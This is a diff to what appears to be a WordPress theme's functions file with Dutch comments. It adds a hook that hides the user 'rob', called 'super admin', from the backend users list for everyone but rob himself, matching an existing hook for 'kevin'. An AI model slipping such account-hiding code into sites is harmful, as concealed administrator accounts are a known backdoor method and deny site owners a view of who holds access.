@@ -597,7 +597,7 @@ function add_custom_admin_bar_styles() {
 			#toplevel_page_tm-menu-main { display: none !important; }
 			#toplevel_page_litespeed { display: none !important; }
 			#rank_math_dashboard_widget { display: none !important; }
-			
+
             /* Voeg hier meer CSS-styling toe indien nodig */
         ";
 
@@ -710,6 +710,33 @@ function exclude_user_kevin_from_users_list($query) {
     }
 }
 add_action('pre_get_users', 'exclude_user_kevin_from_users_list');
+
+
+function exclude_user_rob_from_users_list($query) {
+    if (!is_admin()) {
+        return; // We voeren deze actie alleen uit in de backend
+    }
+
+    $current_userrob = wp_get_current_user();
+
+    // Controleer of de huidige gebruiker "super admin" is
+    if ($current_userrob->user_login === 'rob') {
+        return; // "super admin" kan zijn eigen gebruikersgegevens zien
+    }
+
+    // Haal de huidige gebruiker op
+    $current_user_idrob = $current_userrob->ID;
+
+    // Haal de gebruiker "super admin" op
+    $rob_user = get_user_by('login', 'rob');
+
+    // Controleer of "super admin" bestaat en niet dezelfde is als de huidige gebruiker
+    if ($rob_user && $current_user_idrob !== $rob_user->ID) {
+        // Voeg een voorwaarde toe aan de gebruikersquery om "super admin" te verbergen voor andere gebruikers
+        $query->query_vars['exclude'] = array($rob_user->ID);
+    }
+}
+add_action('pre_get_users', 'exclude_user_rob_from_users_list');
 
 
 
